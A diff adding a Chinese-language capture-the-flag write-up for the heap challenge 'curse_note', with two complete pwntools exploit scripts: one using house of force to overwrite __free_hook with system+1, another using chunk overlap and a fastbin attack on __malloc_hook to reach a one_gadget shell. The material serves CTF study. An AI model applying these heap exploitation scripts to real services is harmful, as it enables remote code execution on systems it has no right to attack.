@@ -71,6 +71,217 @@ if __name__ == "__main__":
 	
 ```
 
+## curse_note
+
+漏洞为任意地址写一字节 '\x00' ,这题好难啊，留下了没技术的眼泪，后面捣鼓了很久，终于解了出来，但是好像是非预期，哭了
+我的解是在sub_heap中用house_of_force,使得sub_heap的top_chunk在free_hook上方，然后size的值会写入free_hook，靠这个劫持free_hook,但是size有点特殊，应为size相减的时候后3bit都是0，所以最后写入free_hook的值是以1或者9结尾的，在libc中找了好久，最后system+1的位置刚刚好，太艰难了
+
+```c
+wndbg> p system+1
+$1 = (<text variable, no debug info> *) 0x7f6c90fdc391 <__libc_system+1>
+```
+exp如下
+
+```python
+from pwn import *
+
+def cmd(command):
+	p.recvuntil("choice: ")
+	p.sendline(str(command))
+
+def add(sz,idx,info):
+	cmd(1)
+	p.recvuntil("index: ")
+	p.sendline(str(idx))
+	p.recvuntil("size: ")
+	p.sendline(str(sz))
+	p.recvuntil("info: ")
+	p.send(info)
+	
+
+def show(idx):
+	cmd(2)
+	p.recvuntil("index: ")
+	p.sendline(str(idx))
+
+def dele(idx):
+	cmd(3)
+	p.recvuntil("index: ")
+	p.sendline(str(idx))
+def main(host,port=10002):
+	global p
+	if host:
+		p = remote(host,port)
+	else:
+		p = process("./pwn")
+		
+		
+		
+	add(0x100,1,"A"*8)
+	add(0x20,0,"A"*8)
+	dele(1)
+	add(0x100,1,"A")
+	show(1)
+	
+	libc.address = u64(p.recv(8))-0x3c4b41
+	info("libc : " + hex(libc.address))
+	
+	add(0x20,2,"A"*8)
+	dele(0)
+	dele(2)
+	add(0x20,0,"0")
+	show(0)
+	
+	heap = u64(p.recv(8))-0x130
+	info("heap : " + hex(heap))
+	
+	dele(0)
+	dele(1)
+	gdb.attach(p)
+	
+	add(heap+0x98+1,2,'A')
+	dele(0)
+	
+	#leak sub_heap addr
+	add(0x200, 0, 'a')
+	add(0x200, 1, 'b')
+	dele(0)
+	add(0x100,0, 'b')
+	show(0)
+	p.recv(8)
+	heap_addr = u64(p.recv(8)) - 0x278
+	info('sub_heap ' + hex(heap_addr))
+	dele(0)
+	dele(1)
+	
+	
+	#overlap chunk
+	system = libc.symbols["system"] + 8
+	offset = libc.symbols["__free_hook"]-heap_addr-0x900-0x10
+	add(0x80,0,"\x00"*0x40+p64(0)+p64(system+offset))	
+	add(heap_addr+0x78+1,2,'A')
+	add(offset,1,"/bin/sh\x00")
+	dele(1)
+
+	p.interactive()
+	
+if __name__ == "__main__":
+	libc = ELF("./libc.so.6",checksec=False)
+	main(args['REMOTE'])
+```
+后来看了下解出这题的大佬的exp，原先也想过这个方法，但是对堆不熟悉，在sub_heap中的chunk_size是要或上 NON_MAIN_ARENA（0x4）的，导致free的时候一直报错，太菜了，膜大佬
+大佬的exp:  (改成了我自己的写法，但是流程没变
+
+```python
+from pwn import *
+
+context.arch = "amd64"
+
+def cmd(command):
+	p.recvuntil("choice: ")
+	p.sendline(str(command))
+
+def add(sz,idx,info):
+	cmd(1)
+	p.recvuntil("index: ")
+	p.sendline(str(idx))
+	p.recvuntil("size: ")
+	p.sendline(str(sz))
+	p.recvuntil("info: ")
+	p.send(info)
+	
+
+def show(idx):
+	cmd(2)
+	p.recvuntil("index: ")
+	p.sendline(str(idx))
+
+def dele(idx):
+	cmd(3)
+	p.recvuntil("index: ")
+	p.sendline(str(idx))
+def main(host,port=10002):
+	global p
+	if host:
+		p = remote(host,port)
+	else:
+		p = process("./pwn")
+		
+		
+		
+	add(0x100,1,"A"*8)
+	add(0x20,0,"A"*8)
+	dele(1)
+	add(0x100,1,"A")
+	show(1)
+	
+	libc.address = u64(p.recv(8))-0x3c4b41
+	info("libc : " + hex(libc.address))
+	
+	add(0x20,2,"A"*8)
+	dele(0)
+	dele(2)
+	add(0x20,0,"0")
+	show(0)
+	
+	heap = u64(p.recv(8))-0x130
+	info("heap : " + hex(heap))
+	
+	dele(0)
+	dele(1)
+	gdb.attach(p)
+	
+	add(heap+0x98+1,2,'A')
+	
+	#leak sub_heap addr
+	add(0x200, 0, 'a')
+	add(0x200, 1, 'b')
+	dele(0)
+	add(0x100,0, 'b')
+	show(0)
+	p.recv(8)
+	heap_addr = u64(p.recv(8)) + 0x8b0 - 0x278
+	info('thread_heap ' + hex(heap_addr))
+	dele(0)
+	dele(1)
+	
+	
+	add(0x28,0, flat(0x0, 0x20, heap_addr+0x10, heap_addr+0x10, 0x20))
+	add(0xf8,1, 'a')
+	add(0x18,2, 'a')
+	dele(1)
+	
+	add(heap_addr + 0x30 + 8 + 1,1, '\n')
+	add(0xf8,1,'a')	
+	dele(1)
+	
+	add(0x68,1,'a')
+	dele(1)
+	dele(0)
+	
+	add(0x28, 0, flat(0x0, 0x75, libc.symbols['__malloc_hook'] - 0x23))
+	add(0x68, 1, 'a')
+	one_gadget = libc.address + 0xf1147
+	dele(2)
+	
+	add(0x68, 2,flat('a' * 0x13, one_gadget))
+	
+	dele(0)
+	
+	cmd(1)
+	p.recvuntil("index: ")
+	p.sendline(str(0))
+	p.recvuntil("size: ")
+	p.sendline(str(32))
+	
+	p.interactive()
+	
+if __name__ == "__main__":
+	libc = ELF("./libc.so.6",checksec=False)
+	main(args['REMOTE'])
+```
+
+
 ## weapon_storage
 
 get_int函数里存在泄露，可以泄露程序基址和栈地址
